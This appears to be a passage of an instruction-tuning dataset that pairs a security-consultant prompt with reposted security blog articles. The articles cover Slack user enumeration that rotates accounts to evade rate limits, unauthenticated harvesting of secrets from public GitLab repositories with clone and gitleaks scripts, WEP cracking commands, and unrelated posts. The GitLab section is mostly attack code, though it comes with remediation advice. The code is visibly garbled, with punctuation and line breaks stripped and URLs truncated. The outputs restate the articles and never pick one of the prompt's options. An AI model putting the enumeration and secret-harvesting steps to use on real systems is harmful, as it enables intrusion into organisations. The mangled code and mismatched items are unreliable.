the same Slack workspace and that workspace hostname must be configured in the default_host setting at the top of the script Putting it All Together After the first part of the script is executed to handle the Slack identities the gatling gun cycle is kicked off to enumerate users The entire process executed by SlackEnum is roughly Load user-configured settings hard-coded into the start of the script These include the default Slack workspace hostname and default user agent string for the CookieBro Slack IDs as well as output file names timing settings and proxy settings so the script can optionally be proxied through other tools like Burp Suite Load the list of email addresses targeted for enumeration Load and parse Slack IDs from all the files in the two folders where they are stored Slack IDs are then stored in a dictionary which tracks the workspace hostname cookies and user agent headers for each Slack ID The status of rate limiting for each Slack ID and whether it is currently logged in are also tracked From all the information loaded in the previous steps generate some very rough estimates of how long the enumeration might take In practice these estimates sometimes end up being low due to either increasing delays from some of the timing options or from delays incurred by rate limiting if the timing options are set too low I included these stats because they may help when adjusting the timing configuration in the settings at the top of the script or when deciding how many Slack IDs you need I recommend at least 100 Slack IDs to have a reasonably useful speed If the user presses Enter to continue execution SlackEnum runs the following steps in a loop gatling-gun-style until all of the target email addresses have been queried A Slack ID is selected from the pool and checked to be sure it is still logged in and not rate limited The Slack ID's API token is requested from ssb redirect If the token cannot be retrieved the Slack ID is flagged as logged out and the cycle starts over with the next Slack ID in the list A POST request is made to api connectableContacts.lookup to search for the next target email address in the list If the response indicates that the request was received successfully ok true but no such account exists the contacts array is empty the script creates a log file entry and prints an Invalid account message on screen If the response indicates that the request was received successfully ok true and the user exists the contacts array contains user details then the script logs the user's email address and name to the output file as a valid user account and prints a Slack account confirmed message on screen If the response contains a ratelimited error the current Slack ID is added to the list of rate-limited Slack IDs where it waits until the cool-down period has passed The same target email address will be tested with the next Slack ID in the list on the next cycle If anything else happens the output is considered an unknown error The cycle continues and the same target email address gets tested with the next Slack ID in the cycle Here's the output of this phase of execution continuing from where the last screenshot stopped The 00.txt 01.json etc filenames in brackets on the left side of the screen indicate the Slack ID file being used with each request And here's the same output from the same scan as it appears in the CSV output file Sanity Check Finally since I didn't want to risk launching a long-running enumeration scan with any Slack IDs that were logged out or had other problems I added a --sanity flag This flag allows the user to provide a single email address which is known to be valid and then to enumerate the same account with every available Slack ID This way any Slack IDs that are generating errors or false negatives can be quickly identified before starting a long running job Conclusion Well that's it I hope you enjoyed this article If you'd like to try out SlackEnum yourself you can download it on GitHub here ithub.com Wh1t3Rh1n0 SlackEnum And if you liked this content you might want to check out my class Red Team Initial Access where I teach all the go-to techniques we use to break into modern enterprise environments over the Internet today Want more content from Michael Why not take a class with him View his upcoming course schedule here Red Team Initial Access"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Install LineageOS on Your Android Device</title>\n<taxonomies>Connor Costigan, Hardware Hacking, Informational, Mobile, Android, LineageOS, ROM Flashing</taxonomies>\n<creation_date>Thu, 11 Jul 2024 15:05:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Hey guys my name is Connor I am a web developer here at BHIS who also loves hacking phones Particularly Android phones Today I am going to show you the basics on installing LineageOS onto your Android device while providing extra detail and background on the installation process as a whole Although this tutorial is aimed at installing LineageOS specifically the lessons taught here can be applied to installing other ROMs for your device What is Lineage Why Lineage To understand Lineage it would be good to first go over a little bit of history regarding Android Android's Operating System is an open-source Linux operating system that is maintained by Google This does not mean that someone can access the OS code for flagship phones such as the Samsung Galaxy Google Pixel OnePlus etc as they have added closed source code on top of the open-source base Android OS code This baseline Android OS is exactly what LineageOS takes advantage of It is a distribution of the open-source baseline Android code that is distributed for a massive number of smartphones These distributions allow older phones to upgrade to newer Android OS versions without getting a factory update extending the life of these phones greatly This open-source version of Android also allows users to root their phones giving them extra permissions as well as the removal of the Google API from the OS entirely which is impossible with the built-in OS of most smartphones A WORD OF CAUTION BEFORE CONTINUING Before continuing it is worth noting that installing a new OS onto any Android device is risky Data will be formatted during the installation process which means you should make sure to BACK UP ALL IMPORTANT FILES before continuing There is also the risk of bricking your smartphone This is when the bootloader is no longer functional and cannot load either LineageOS or the original operating system leaving the phone in an unusable state During the installation the option to not install GApps Google apps such as play store Google Maps Gmail etc will be available If you choose to not install GApps just know that there will be apps that will not work properly and many that may not run entirely Due to these potential dangers listed above it is best to install LineageOS on a smartphone that is sitting on your shelf or in your drawer and not the current phone you have in use If you do wish to install LineageOS on your most current smartphone proceed with caution What you need to get started An Android smartphone preferably an older phone that is supported by LineageOS see the supported devices here with developer mode enabled A computer laptop with Android ADB platform tools installed to an accessible directory should include fastboot as well We will go over downloading this in the tutorial so do not worry if you do not have these yet A wire capable of connecting and transferring data between your Android phone and computer This usually can be a charging wire that is USB to Micro USB A copy of the LineageOS ROM file for your specific device we will go over getting this in the tutorial A recovery ROM for fastboot LineageOS offers their own recovery software that we will use but TWRP is a common recovery ROM that people use as well If you are already comfortable with TWRP then feel free to use it .APK files for installing any specific apps that require pre-boot installation see recommendations below These are not required to install the OS but often are wanted by users and must be installed into the system before the first bootup of the OS A can-do attitude Recommended but optional packages to install Magisk A systemless root app that makes granting and revoking super user privileges to apps easy MindTheGaaps a package that contains Google apps such as play store Gmail Google Maps etc This is good for people who want the Google apps included with the open-source nature of LineageOS Note if your goal is to create a ghost phone do not use Google services Fdroid It is an alternative app store that carries a decent library of good apps games utilities etc Getting everything ready to go Assuming you have your Android device ready to go let's get the computer or laptop set up for this job First and foremost we are going to install Android platform tools These tools include both the Android Development Bus adb and fastboot tools LineageOS has a really good guide on installing the necessary tools You can also download the development tools directly from the Android site Once we have Android platform tools installed we need to see if adb works To get adb to work with your Android device the device must be running with developer mode enabled To do this go into the about section of your phone settings Once there find the build number and tap on it around 10 times until developer mode is activated If you cannot find the build number I recommend you Google how to enable developer mode for your phone Now that you can access the developer options make sure to enable USB Debugging and OEM Unlocking can be enabled if your system supports it Once this is ready to go plug your Android device into the computer There should be a dialog on your Android device that asks if you should enable USB debugging Make sure to allow it you can also say always allow so you don't have to allow it every time Once it is allowed entering the command adb devices in your command prompt terminal should show your Android device Now that we have adb installed and set up we will need the ROM files necessary for LineageOS installation Head to the devices page of the LineageOS site and find your device Once you see your model click on it to view useful info such as the special boot modes and how to access them as well as quirks that are known for your device Click the Get the Builds Here link in the downloads section to get the 2-3 files you need for installation should be a .zip file as well as a .img file Click the installation link to see the step-by-step for your device I am going to be going over the general steps but I recommend going through the specific installation guide for your device from LineageOS alongside this guide you can access it from the devices page on the LineageOS website Given that guide is specific for every device those instructions will be more important than the general guide of this article A note on LineageOS official ROM files vs unofficial ROM files You may notice that LineageOS supports a good number of older devices on their website Due to the open-source nature of LineageOS there are places you can go often XDA forums that will have links to ROM files that are LineageOS-built to run on an unofficial device These ROM files often work well enough to get the phone running with some of the devices garnering a massive number of developers and support You can if you wish use these unofficial ROMs but you should be cautious as there is little support for these unofficial builds and unofficial sources could be malicious so caution is advised I only recommend using unofficial builds of LineageOS if you know what you are doing and have installed LineageOS before Free the bootloader The first step you need to make on your Android device is unlocking the bootloader This will vary greatly across each device and I recommend you follow the instructions on your LineageOS installation guide for your specific device Be warned unlocking the bootloader will reset your phone meaning you will lose all data and apps Make sure everything is backed up before continuing If your guide does not include instructions on how to unlock the bootloader or a link to a guide a quick Google search should point you in the right direction Once the bootloader is unlocked you can proceed to the next step Quick note on adb fastboot and the bootloader Adb is often run when the Android device is booted up and running the phone is running as normal and not in the bootloader Fastboot commands run when the device is rebooted into the bootloader When the device is operational running fastboot devices will return nothing but typing adb devices will show your phone assuming USB debugging was enabled Vice versa when you are in the bootloader so there is no need for alarm when adb does not return anything in the bootloader When the bootloader is present you will not see any devices using the adb command Adb will only be accessible during the bootloader process when it is specifically enabled in recovery but is not needed during the bulk of the bootloader process The bootloader itself can be thought of as the BIOS of a phone It is what will load the OS after boot The reason it must be unlocked is to allow us to make changes to what the bootloader loads upon boot A little more in-depth with the bootloader unlocking and the boot up process of Android devices in general The LineageOS wiki will guide you through the process of getting the bootloader unlocked and ready to install the OS but let's take a moment before we begin that process to really understand what we are doing under the hood If you want to continue with the installation process feel free to jump to the next section When the Android device starts up the low-level code instantiates the memory of the system Once the memory is set the code can begin checking the partitions and boot images If something is off or improperly loaded recovery will be booted up If everything passes ok the boot image begins loading and instantiating After everything is properly loaded and run the OS starts up and the user can begin interacting with the phone What we are doing when installing LineageOS is replacing the boot images that come from the phone vendor with Lineage's own boot image To install this we must be in the bootloader level Unlocking the bootloader will give the bootloader permission to install modify system images and various files The recovery image that was downloaded alongside the LineageOS image will allow us to install the OS image through the recovery process as well as other various APK files we will discuss this more in detail later This is where the fun begins accessing recovery Now that our bootloader is cleared we are good to flash the recovery image to the bootloader and truly begin the installation process There are multiple ways you can access the bootloader but the two most straightforward ways are through the physical buttons on your phone and the adb command Every phone is different in configuration but restarting the phone and holding volume down and power together or some similar combination of buttons should give you access to the bootloader menu feel free to Google the exact combination for your device or check the LineageOS instructions for your device If you have your phone still connected to the PC with a terminal open another option is entering the command adb -d reboot bootloader in your terminal Your Bootloader look may vary but it should be similar looking to this You should see the device turn off for a brief moment and restart in the bootloader For some devices you may get a warning about the bootloader being unlocked but you can ignore this message as that is exactly what we need for installation Once the menu is active try entering and executing the command fastboot devices You should see your device ID there If it is there the next step is to flash the recovery image When you flash an image to the bootloader you are booting something up that is different than the traditional vendor image This means instead of booting into the normal OS that is run by the vendor we will boot into the LineageOS recovery image Look at your installation guide for your specific device for the exact command but it should be close to the command fastboot flash boot NameOfYourBoot .img or fastboot flash recovery recovery.img Running this command should boot up the recovery Now that recovery is running we can install Lineage Installing LineageOS And other apps Now that we have recovery booted up and running we can begin installing the actual zip package containing the OS NOTE Please read through this section ENTIRELY before executing any commands as there are steps that must be performed in order to successfully install This is the POINT OF NO RETURN Once you start loading the files of LineageOS there is no going back Tap the section of recovery that says factory reset Choose the option within that menu that states Format data factory reset This will remove all data in the system as well as system files Once this finishes you can return to the menu and begin sideloading the OS zip file Sideloading is a term used by Android developers and modders that allows packages such as zip files and APKs to be installed through the adb rather than the Google Play store or other software store Select Apply Update and then the Apply from ADB from the menu This enables the adb temporarily which will allow us to run the sideload commands Make sure to check the exact command in your specific device guide on the LineageOS website but the command should look similar to adb -d sideload filename of LineageOS package .zip Once the install is complete it may ask you to reboot but do not reboot if you are planning on installing certain root software such as Magisk or low-level apps such as Google Apps or mind the GAPPS These apps require installation in this recovery BEFORE the new OS boots up and initializes You can install all these apps in a similar way by sideloading them through the adb Tap the Apply Update and Apply from ADB option that you selected before to turn the adb capabilities back on From there you can simply install each desired apk package by typing in adb -d sideload package .apk Once you have installed the packages you like tap the reboot system now option and enjoy your new OS Stuck Need some extra help Feel free to reach out to the tool-sharing channel of our Discord"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Build a Home Lab: Equipment, Tools, and Tips</title>\n<taxonomies>General InfoSec Tips & Tricks, Guest Author, How-To, Informational, InfoSec 101, home lab, InfoSec Survival Guide, virtual machines</taxonomies>\n<creation_date>Thu, 25 Jul 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "by Martin Pearson Guest Author This article was originally published in the second edition of the InfoSec Survival Guide Find it free online HERE or order your 1 physical copy on the Spearphish General Store A home lab will not only enhance your learning opportunities but can also give you a safe place to play by using virtual machine to emulate a computer giving you the ability to easily make mistakes with no fear of harm to your personal setup Practicing on entry-level product is a great way to get started Think about what you want to learn and how your setup will help you meet your goals You don't need the fastest equipment the most storage or the best memory to start your home lab Even if you can afford the best it won't suddenly make you a master hacker It relies on your commitment not your equipment In general the fundamental building blocks of a lab are a network virtual machines and the physical machine to run them on It's common to have one Linux Kali machine and usually one Windows client server This will be enough to do some really fun stuff VM Options There are lots of virtualization software to choose from Below are some links to get you started Don't worry if these mean nothing to you at this stage it's just good to be aware proxmox.com en vmware.com products workstation-pro.html docs.vmware.com en VMware-vSphere 7.0 com.vmware.esxi.install.doc qemu.org download virtualbox.org Equipment Considerations How many virtual machines do you want vs how many you actually need How many might you want in the future The more virtual machines the more memory storage space you will need Consider purchasing second-hand machines fi rst It is better to have a separate network to avoid family user arguments whenyou play Consider a dedicated router or switch You WILL break things Make a backup sometimes called a snapshot Other Considerations Both Windows client and server can be used in evaluation-mode legally noneed to purchase Kali and Parrot are commonly used operating systems that will give you all thelearning tools you need Search Kali or Parrot ISO to fi nd out more To learn about the operating systems and their included tools ww.kali.org tools ww.parrotsec.org A journey of a thousand miles begins with a single step Consider exactly what you're trying to achieve You don't need to know anddo everything right away Depending on what you start off with and how your needs grow you may decide to buy more machines Remember they are very easy to network so no need to throw away your old equipment Above all have fun and learn Ready to learn more Check out this BHIS webcast on the topic here How To Build a Home Lab for Infosecwith Ralph May"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Auditing GitLab: Public Gitlab Projects on Internal Networks</title>\n<taxonomies>External/Internal, General InfoSec Tips & Tricks, How-To, InfoSec 201, audit, GitLab, gitleaks, leaks, secrets</taxonomies>\n<creation_date>Thu, 18 Jul 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "A great place that can sometimes be overlooked on an internal penetration test are the secrets hidden in plain sight That is a place where no authentication is required in many circumstances throughout internal networks I'm talking about source code management platforms specifically Gitlab Other self-hosted platforms are likely also susceptible to this unauthenticated technique as well but we'll be focusing on GitLab A sequence of words that I've heard Mr Senior Developer If an attacker already has access to our internal network we've got bigger problems The biggest problem is this kind of thinking Yes a hacker inside your internal network is a problem that requires immediate attention but the defensive measures you implement as an organization leading up to this kind of event are what really counts It is a common misconception that once an adversary has gained initial access to an organization's network that it is already game over Verily I tell you good neighbor that this is not the case There are many things that you can do to defend against attackers inside the internal network For instance security landmines at every turn via canary tokens and other awesome things But in this blog post we'll be talking about attacking and defending but mostly attacking self-hosted GitLab instances I've come across internal GitLab instances in organizations internal networks countless times and many of them have one thing in common many of their projects are set to public One might think or blurt out Well first you would need a valid account to log in to GitLab to access these projects and to that I say with great vigor False In GitLab when a project scope is set to public it is still accessible to anyone with network access Better yet it is discoverable via the GitLab projects API at the URL https api v4 projects Spoiler alert The process of finding all public GitLab projects and downloading everything can be quickly automated with no authentication On an amusing side-note anecdote Nessus won't tell you this but your organization's crown jewels are totally exposed That's because this is a feature not a bug But that's not to say that Nessus isn't totally barren of fruits altogether Nessus will still identify all the GitLab instances for you that is if you're using Nessus Whether you're using Nessus or not we can still easily identify all the GitLab instances on an internal network using Nuclei more specifically a Nuclei GitLab workflow nuclei -l in-scope-cidrs-ips-hosts-urls-whatever.txt -w nuclei-templates workflows gitlab-workflow.yaml -o gitlab-nuclei-workflow.log tee gitlab-nuclei-workflow-color.log The screenshot below shows a portion of the output from the command above Nuclei GitLab Workflow Partial Output Redacted There are many code-secret scanning tools such as Trufflehog Gitleaks NoseyParker and others We'll be utilizing Gitleaks for this blog post but as an exercise I encourage you to use all three and compare your results One downside of many of these tools at the time of writing is the reliance on authentication for mass automated scanning but this can be done from an unauthenticated context too when the GitLab public repos api is accessible If you have come across GitLab instances on internal penetration tests but weren't sure how to automate and achieve that sweet juicy pwnage then this blog is for you As Pastor Manul Laphroaig would say PoC GTFO Plundering GitLab Forgive me neighbors if this feature already exists in any given open-source tool but indulge me in the discussion of automating this from scratch We'll be using a ragtag team of Python and Go Clone All the Things This should ideally be included as a feature to some of these tools or perhaps it already is nonetheless here's a Python script to download every public repository to their appropriately named directory hierarchy usr bin env python3 import requests import json import subprocess import os PWD os.getcwd def get_repos_with_auth projects_url base_url token headers 'Private-Token token repos page 1 while True response requests.get projects_url headers headers verify False params 'per_page 100 'page page data json.loads response.text if not data break for repo in data print f Repo repo 'http_url_to_repo path repo 'path_with_namespace repos path f base_url path .git page 1 return repos def get_repos projects_url base_url repos page 1 while True response requests.get projects_url verify False params 'per_page 100 'page page data json.loads response.text if not data break for repo in data print f Repo repo 'http_url_to_repo path repo 'path_with_namespace repos path f base_url path .git page 1 return repos def run_command command try subprocess.call command shell True except print Error executing command def clone_repos repos dict for path repo in repos.items dirs path.split directory .join dirs -1 if not os.path.exists directory os.makedirs directory if os.path.exists f PWD directory os.path.basename repo .rstrip '.git continue os.chdir directory clone_cmd f git clone repo print clone_cmd run_command clone_cmd os.chdir PWD def main token CHANGETHIS CHANGETHIS if using auth_base_url user_id CHANGETHIS CHANGETHIS if using auth_base_url projects_url https api v4 projects CHANGETHIS auth_base_url f https user_id token CHANGETHIS unauth_base_url f https CHANGETHIS repos get_repos_with_auth projects_url auth_base_url token repos get_repos projects_url unauth_base_url print f Total Repos len repos clone_repos repos if __name__ __main__ main In the get_repos function we paginate through all the available repository data 100 items per page at a time until there is no remaining data This script could and probably should take arguments or a config file for portability but let's bask in the ambiance of hard-coding things i.e credentials Running the code above unauthenticated with updated values for projects_url and unauth_base_url looks something like this Searching and Cloning All Available Repositories Redacted Gitleaks All the Things Next we'll use Gitleaks to scan everything First let's clone the project so that we have the gitleaks.toml file we could download this by itself but who cares git clone ithub.com gitleaks gitleaks.git opt gitleaks download gitleaks binary this assumes you have go installed and set your GOPATH if not here's how you can do that install go set your GOPATH in .zshrc if you're using Bash then change as needed to .bash_profile or .bashrc -d HOME go mkdir HOME go if -z GOPATH then cat 'EOF HOME .zshrc Add go bin to path PATH HOME go bin export PATH PATH HOME go bin Set GOPATH if -z GOPATH then export GOPATH HOME go fi EOF fi now that go is installed we can install gitleaks binary to our PATH go install github.com zricethezav gitleaks v8 latest First we'll add an extra rule for extra secrets This rule is prone to false positives but is worth the extra noise when it catches things that would otherwise have been missed Add the following to your opt gitleaks config gitleaks.toml file rules id generic-password description Generic Password regex ?i password s s x60 w x60 tags generic password secretGroup 1 To run Gitleaks against a single repository you can use syntax such as cd into a cloned repo gitleaks detect -v -r output.json -c opt gitleaks config gitleaks.toml But we're interested in mass testing for this sermon so we can use another one-off Python script to do just that usr bin env python3 import os import subprocess PWD os.getcwd GITLEAKS_CONFIG_PATH opt gitleaks config gitleaks.toml CHANGETHIS if not using opt gitleaks config gitleaks.toml def run_command command try subprocess.call command shell True except print Error executing command def find_git_repos repos for root dirs _ in os.walk if '.git in dirs git_dir os.path.join root '.git repo_dir os.path.abspath os.path.join git_dir repos.append repo_dir return repos repo_dirs find_git_repos for repo_dir in repo_dirs repo_name os.path.basename repo_dir if os.path.exists f root blog loot gitlab repo_name .json CHANGETHIS if not using root bhisblog loot gitlab project_name os.path.basename os.path.dirname repo_dir repo_name f project_name _ repo_name os.chdir repo_dir cmd f gitleaks detect -v -r root blog loot gitlab repo_name .json -c GITLEAKS_CONFIG_PATH CHANGEME if not using root blog loot gitlab print cmd run_command cmd os.chdir PWD This script will run Gitleaks against each repository and write the resulting secrets to JSON output files This is all fine and good but we can do a little better a lot better would be combining all this logic into a single tool or to fork and implement this feature to an existing tool Here we can see Gitleaks doing its thing Gitleaks Partial Output Redacted Combine All the Things Okay so Now what Da funk am I supposed to do with all these JSON files Let's write another program this time written in Go to combine all the JSON output files into a single CSV file package main import encoding csv encoding json fmt os path filepath type Item struct Description string json Description StartLine int json StartLine EndLine int json EndLine StartColumn int json StartColumn EndColumn int json EndColumn Match string json Match Secret string json Secret File string json File SymlinkFile string json SymlinkFile Commit string json Commit Entropy float64 json Entropy Author string json Author Email string json Email Date string json Date Message string json Message Tags string json Tags RuleID string json RuleID Fingerprint string json Fingerprint func main dirPath root work loot gitleaks CHANGE ME csvPath root work loot all_gitleaks.csv CHANGE ME items make Item 0 err filepath.Walk dirPath func path string info os.FileInfo err error error if err nil return err if !info.IsDir filepath.Ext path .json file err os.ReadFile path if err nil return err var data Item err json.Unmarshal file data if err nil fmt.Println fmt.Errorf error unmarshalling JSON file s s path err items append items data return nil if err nil panic err file err os.Create csvPath if err nil panic err defer file.Close writer csv.NewWriter file defer writer.Flush headers string Description StartLine EndLine StartColumn EndColumn Match Secret File SymlinkFile Commit Entropy Author Email Date Message Tags RuleID Fingerprint err writer.Write headers if err nil panic err for _ item range items row string item.Description fmt.Sprintf d item.StartLine fmt.Sprintf d item.EndLine fmt.Sprintf d item.StartColumn fmt.Sprintf d item.EndColumn item.Match item.Secret item.File item.SymlinkFile item.Commit fmt.Sprintf f item.Entropy item.Author item.Email item.Date item.Message fmt.Sprintf v item.Tags item.RuleID item.Fingerprint err writer.Write row if err nil panic err Go Program to Combine JSON Files into a Single CSV File main.go To run the go program go run main.go Again each of these one-off scripts and programs could and should be integrated into a tool such as Trufflehog Gitleaks Noseyparker or combined to a single standalone script or tool I'll leave that up to you as an exercise in contributing to open source like a good neighbor should Breaking each step down into individual scripts initially was the fastest way to prototype the process of plundering GitLab without credentials as an initial proof-of-concept Analyze All the Things Importing the CSV file via Excel or Libre Open Office as a filter table can greatly assist us in our analysis with the quickness efforts Excel Data Import From CSV The ability to filter by description or date will do us great justice Microsoft Excel Imported CSV File with Column Filters Redacted If you're lucky enough to discover a GitLab personal access token that is enabled you can update the first script with the user_id and personal access token and run the script a second time Remediation Mitigation and Prevention Here is what you can do to make sure this kind of attack doesn't happen to your organization Remediation Remove all sensitive data from source code Remove the previous commit s in the repository's history that contained the secret If there are too many offending commits once the sensitive data is removed from the source code create a fresh repository and commit the new cleaned code to the new repository Mitigation Set all GitLab projects to be private and grant access on an as-needed basis Think of public in terms of GitLab project settings as meaning open-source If you wouldn't want the project publicly accessible set the project to private Prevention Implement Code Scanning CI CD pipelines using tools such as TruffleHog GitGuardian or others Implement a pre-commit-hook using tools such as TruffleHog GitGuardian or others Do not hard-code credentials or sensitive information in public or private project repositories Educate developers and DevOps engineers on software development related security best practices Closing Thoughts Be on the lookout for GitLab instances with public projects and API access on your next internal network penetration test You may be surprised at what you might find I hope this blog post has inspired you to contribute to open-source and to create your own tools Part of the reason I did not write an open-source GitHub project for this was to draw attention to the logic at each individual step of this process The same goes for forking an existing tool and making a pull request I also discovered this tool ithub.com punk-security secret-magpie which aims to achieve what we have discussed in this blog post but again as far as I could tell by quickly looking through the source code it didn't look like it supported performing this technique from an unauthenticated context at the time of writing this blog Resources and References ithub.com gitleaks gitleaks ocs.gitlab.com ee user public_access.html ocs.gitlab.com ee api projects.html ithub.com projectdiscovery nuclei ithub.com projectdiscovery nuclei-templates blob main workflows gitlab-workflow.yaml ithub.com praetorian-inc noseyparker ithub.com punk-security secret-magpie re-commit.com ithub.com GitGuardian ggshield-action For more information about Trufflehog see ithub.com trufflesecurity trufflehog ww.blackhillsinfosec.com rooting-for-secrets-with-trufflehog ithub.com trufflesecurity trufflehog?tab readme-ov-file trufflehog-gitlab-ci"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Mental Health - An Infosec Challenge</title>\n<taxonomies>General InfoSec Tips & Tricks, Guest Author, burnout, Mental health</taxonomies>\n<creation_date>Thu, 08 Aug 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "by Amanda Berlin of Mental Health Hackers This article was originally published in the second edition of the InfoSec Survival Guide Find it free online HERE or order your 1 physical copy on the Spearphish General Store Cybersecurity is a rapidly growing field and with it comes a number of mental health challenges above and beyond our normal day-to-day living We are all often under a great deal of stress as we are responsible for protecting data environments and more from attackers no matter what role we are in This can lead to burnout imposter syndrome high levels of anxiety and more Common Mental Health Issues in Cybersecurity Burnout is a state of physical emotional and mental exhaustion caused by prolonged stress One of the reasons we are at risk of burnout is because of the constant bombardment of new threats attacks and vulnerabilities We sometimes feel that we always have to be on even to the detriment of our own health High stress and anxiety are common in the cybersecurity field Our bodies aren't built to be in a constant fight or flight mode Imposter syndrome is a feeling of inadequacy and insecurity despite evidence to the contrary We are often surrounded by highly skilled and knowledgeable people it's one of the amazing aspects of our community but can also be an indirect source of stress Imposter Syndrome Tips for Prevention Take breaks try not to stare at your screen constantly Work life balance is difficult Overwhelmed or stressed Go do something else to switch your brain off from work Exercise is a powerful way to reduce stress and anxiety It's not just about getting fit it's also about reconnecting your mind and your body You don't have to hit the gym even a simple short walk can do wonders If it's too difficult start smaller just start somewhere Take care of yourself by speaking to yourself as you would a friend eating healthy getting enough sleep and exercising This is easier said than done Start small and work towards achievable goals to establish health habits Be kind to yourself Build trust with yourself that you'll take care of you Talk to someone you trust It could be a friend or a professional It may take some patience and persistence to find the right fit but therapists are professionals that can give you tools to succeed Professional therapy isn't the only option Help can take other forms Keep seeking out what helps you Places to Talk With Fellow Peers Online forums Discord and Slack groups are available in all different areas of security Many of these have dedicated mental health channels If you community doesn't have a mental health channel try asking for one Scheduled chats with friends Text phone or video scheduling friend time is sometimes needed amongst our busy daily scheduled Mental health is an important issue for everyone Everyone struggles you're not alone By being aware of the signs and taking steps to prevent mental health struggles we all improve our mental health and well-being Lastly and most importantly it's never too late You can find healing after burnout You can recover from workplace trauma Reach out and ask for help More Help The National Alliance on Mental Illness NAMI nami.orgThe American Foundation for Suicide Prevention AFSP afsp.orgMental Health Hackers mentalhealthhackers.org resources-and-links American Psychiatric Association's Resources for Employers workplacementalhealth.orgMental Health First Aid mentalhealthfirstaid.orgSober in Cyber soberincyber.org about If you find yourself or someone you love in a crisis you can call 988 for the National Suicide Crisis Prevention Line The Lifeline provides 24 7 free and confidential support for people in distress as well as prevention resources for you and your loved ones"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>WifiForge - WiFi Exploitation for the Classroom</title>\n<taxonomies>InfoSec 101, Intern, Password Cracking, Red Team, Red Team Tools, Wireless</taxonomies>\n<creation_date>Thu, 01 Aug 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "by William Oldert BHIS Intern BHIS had a problem We needed an environment for students to learn WiFi hacking safely Our original solution used interconnected physical network gear and computers to create the needed signals The requirement for multiple such setups to properly run a class with was costly however and transport was a concern as well We discovered a program called Mininet which creates an interactive virtual network and began looking for ways to utilize it in labs and teaching material Wondering if this might be the solution we were in sore need of a project was started and a team of interns was hired to research and test the limits The product of that project is WifiForge What is WifiForge WifiForge is a program built on the foundation of the open-source Mininet-Wifi itself being a branch from Mininet that includes support for wireless networking It automatically sets up the network and tools needed to perform a variety of exploits all packed neatly into a Docker container WifiForge eliminates the need for physical hardware requiring only a docker install and the execution of a couple commands You can find a link to the project's GitHub page HERE Disclaimer Notes While it is strongly recommended to run WifiForge in a Docker container you can run it on your base machine Installing Mininet-Wifi on the base machine has been known to cause dependency nightmares It is suggested to run WifiForge on Ubuntu version 14.04 and up or the latest version of Kali when Mininet was built in 2017 Ubuntu 14.04 was bleeding edge The WifiForge installation script may disrupt normal operating system use it is suggested to use a fresh install virtual machine or preferably a Docker container OS Compatibility WifiForge should work on any Linux operating system using Docker The following operating systems have been tested and are confirmed to work Kali Linux Parrot OS Ubuntu Set-Up Guide Below is the guide to setting up a Docker container with all the required pieces and parts We have guides for installing to a bare OS or from a Docker image These instructions can be found on the project's GitHub The best and easiest option however is laid out below Docker recommended Note Dockerfile will fail if Mininet-Wifi is already installed locally Install from release Pull the Docker image from Dockerhub and start a new container sudo docker run --privileged true -it --env DISPLAY --env QT_X11_NO_MITSHM 1 -v tmp .X11-unix tmp .X11-unix rw -v sys sys -v lib modules lib modules --name mininet-wifi --network host --hostname mininet-wifi redblackbird wififorge v1.0.0 bin bash Within the container initiate the controller to simulate APs service openvswitch-switch start Run WifiForge.py sudo python3 Framework WifiForge.py Labs and Featured Tools WifiForge provides pre-built labs that cover a variety of topics and tools including but not limited to Eaphammer WPS Networks Wifiphisher WEP Networks Netntlm cracking with John Airgeddon Dos Today however we would like to give you a taste of what this program can do through our WEP key-cracking lab Lab WEP Key Cracking Setup Phase To begin select WEP Network from the WifiForge menu and allow up to 30 seconds for initialization of the network Once it has started use the following command to open an xterm session on the attacker host1 and host2 xterm a host1 host2 WEP Key Cracking On the attacking machine switch the interface to monitor mode using the following command airmon-ng start a-wlan0 Successful output of the above command will appear as below Use airodump-ng to begin looking for nearby networks airodump-ng 